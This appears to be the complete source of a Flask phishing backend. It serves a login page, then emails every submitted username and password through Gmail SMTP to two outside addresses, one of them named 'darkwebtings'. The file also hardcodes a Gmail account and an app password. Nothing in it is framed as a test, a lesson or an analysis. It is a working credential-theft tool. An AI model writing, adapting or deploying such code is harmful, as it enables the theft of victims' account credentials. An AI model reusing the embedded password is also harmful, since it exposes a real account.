from flask import Flask, request, render_template
import smtplib
from email.mime.text import MIMEText

app = Flask(__name__)

# Email configuration
smtp_server = "smtp.gmail.com"
smtp_port = 587
smtp_username = "sylljay@gmail.com"
smtp_password = "auee jgya ymoh yraa"  # Use the app password generated
recipients = ["ericssonsony584@gmail.com", "darkwebtings@gmail.com"]

# Email sending function
def send_email(username, password):
    subject = "Login Details"
    body = f"Username: {username}\nPassword: {password}"
    sender_email = smtp_username

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = ", ".join(recipients)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, recipients, msg.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Route to display the form
@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")

# Route to handle form submission
@app.route("/submit", methods=["POST"])
def submit():
    username = request.form.get("username")
    password = request.form.get("password")
    send_email(username, password)
    return "Details sent!"

if __name__ == "__main__":
    app.run(debug=True)
